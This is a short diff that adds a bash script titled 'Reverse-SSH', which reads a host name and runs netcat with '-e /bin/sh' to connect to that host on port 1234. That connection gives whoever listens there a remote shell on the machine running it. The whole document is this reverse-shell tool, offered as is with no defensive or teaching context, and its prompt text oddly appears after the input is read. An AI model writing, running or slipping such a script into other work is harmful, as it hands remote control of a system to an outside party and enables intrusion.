@@ -1,0 +1,7 @@
+#!/bin/bash
+
+echo "Reverse-SSH"
+read host
+echo "Enter Host: "
+nc -e /bin/sh $host 1234
+
